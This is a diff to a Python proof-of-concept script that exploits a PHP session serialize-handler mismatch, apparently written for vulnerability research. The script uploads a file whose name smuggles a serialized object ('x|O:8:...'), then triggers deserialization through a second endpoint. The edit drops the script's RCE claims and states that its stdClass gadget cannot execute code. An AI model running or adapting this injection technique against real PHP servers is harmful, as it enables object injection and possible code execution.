@@ -6,7 +6,7 @@ Demonstrates:
   1. Session written in php_serialize format (via directory with .user.ini)
   2. Pipe | in filename preserved in php_serialize format
   3. php handler reads the session → splits at | → deserializes injected object
-  4. __destruct fires even when decode returns FAILURE (trailing data)
+  4. Mismatched decoding is reported and the rejected session is destroyed
 
 Setup required:
   - /app/ directory with .user.ini: session.serialize_handler = php_serialize
@@ -87,8 +87,10 @@ def main():
     gadget = 'x|O:8:\\"stdClass\\":0:{}'
     print(f"[1] Writing session via {args.write_path} (php_serialize)")
     print(f"    Filename payload: {gadget}")
-    upload(host, port, args.write_path, args.sid, gadget)
-    print("    → Session file written in php_serialize format")
+    write_resp = upload(host, port, args.write_path, args.sid, gadget)
+    write_status = write_resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if write_resp else "NO RESPONSE"
+    print(f"    Response: {write_status}")
+    print(f"    → Inspect /tmp/sessions/sess_{args.sid} now, before the read request")
 
     # Step 2: Trigger via php handler endpoint
     print(f"\n[2] Triggering mismatch via {args.read_path} (php handler)")
@@ -97,16 +99,20 @@ def main():
 
     status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
     print(f"    Response: {status}")
+    body = resp.split(b"\r\n\r\n", 1)[-1].decode("utf-8", "replace") if resp else ""
+    if body:
+        print("    Body:")
+        for line in body.splitlines()[:8]:
+            print(f"      {line}")
 
     print()
     print("[*] Verification indicators:")
     print("    - 'Failed to decode session object' warning = mismatch triggered")
-    print("    - 'Session object destruction failed' = __destruct fired on injected object")
-    print("    - If target has a class with exploitable __destruct → RCE")
+    print("    - The read request destroys the rejected session; its file may no longer exist")
+    print("    - stdClass has no __destruct method, so this payload does not demonstrate RCE")
     print()
-    print("[*] Check target for:")
-    print(f"    - Session file: /tmp/sessions/sess_{args.sid}")
-    print("    - Evidence of __destruct execution (file writes, network connections, etc.)")
+    print("[*] To inspect the written session, check its file between steps 1 and 2:")
+    print(f"    /tmp/sessions/sess_{args.sid}")
 
 
 if __name__ == "__main__":
